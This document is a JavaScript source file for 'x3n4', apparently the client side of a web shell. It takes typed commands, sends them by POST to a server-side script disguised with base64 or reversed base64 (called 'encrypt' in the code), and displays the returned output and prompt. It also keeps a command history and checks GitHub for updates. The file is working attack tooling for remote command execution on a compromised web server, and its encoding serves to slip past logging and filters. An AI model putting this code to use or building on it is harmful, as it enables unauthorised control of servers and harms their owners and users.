function x3n4 (options) {
  this.version = options.version;
  this.script_path = options.script_path;
  this.algo = options.algo;
  this.history = {
    list: JSON.parse(window.localStorage.getItem('history') || '[]'),
    position: -1,
    up: function() {
      if (this.list.length === 0) return;
      if (this.position < (this.list.length - 1)) {
        this.position++;
      }
      this.render();
    },
    down: function () {
      if (this.list.length === 0) return;
      if (this.position >= 0) {
        this.position--;
      }
      this.render();
    },
    render: function () {
      $('#stdin').val(this.list[(this.list.length - 1) - this.position]);
    },
    add: function (value) {
      this.list.push(value);
      this.position = -1;
      this.save();
    },
    clean: function () {
      this.list = [];
      window.localStorage.removeItem('history');
    },
    save: function () {
      window.localStorage.setItem('history', JSON.stringify(this.list));
    }
  };
  this.encrypt = function(input) {
    switch (this.algo) {
      case 'b64':
      return window.btoa(input);
      case 'rb64':
      return window.btoa(input).split('').reverse().join('');
    }
    return input;
  };
  this.decrypt = function(input) {
    switch (this.algo) {
      case 'b64':
      return window.atob(input);
      case 'rb64':
      return window.atob(input.split('').reverse().join(''));
    }
    return input;
  };
  this.execCommand = function(command) {
    this.history.add(command);
    /* Internal command handler */
    switch (command.trim()) {
      case 'clear':
      $('#stdout').html('');
      return;
      case 'exit':
      this.history.clean();
      break;
    }
    $('#stdout').append($('#pwd').html() + " " + command + "\n");
    var that = this;
    /* Server-side command handler */
    $.post(this.script_path, {cmd: this.encrypt(command)}, function(data) {
      data = JSON.parse(that.decrypt(data));
      $('#stdout').append(data.stdout);
      $('#pwd').html(data.banner);
      $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
    });
  };
  this.clickExecCommand = function() {
    window.x3n4.execCommand($('#stdin').val());
    $('#stdin').val('');
  };
  this.checkUpdate = function() {
    $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
      if (window.x3n4.version !== data[0].tag_name) {
        $('#stdout').append('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
        $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
      }
    });
  };
  this.declareCallbacks = function() {
    $('#btnExecCommand').on('click', this.clickExecCommand);
    $('#stdin').on('keypress', function(ev) {
      if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
        $('#btnExecCommand').click();
      }
    });
    $('#stdin').on('keydown', { history : this.history }, function (ev) {
      var code = ev.keyCode ? ev.keyCode : ev.which;
      switch (code) {
        case 38:
        ev.data.history.up();
        break;
        case 40:
        ev.data.history.down();
        break;
      }
    });
  };
}
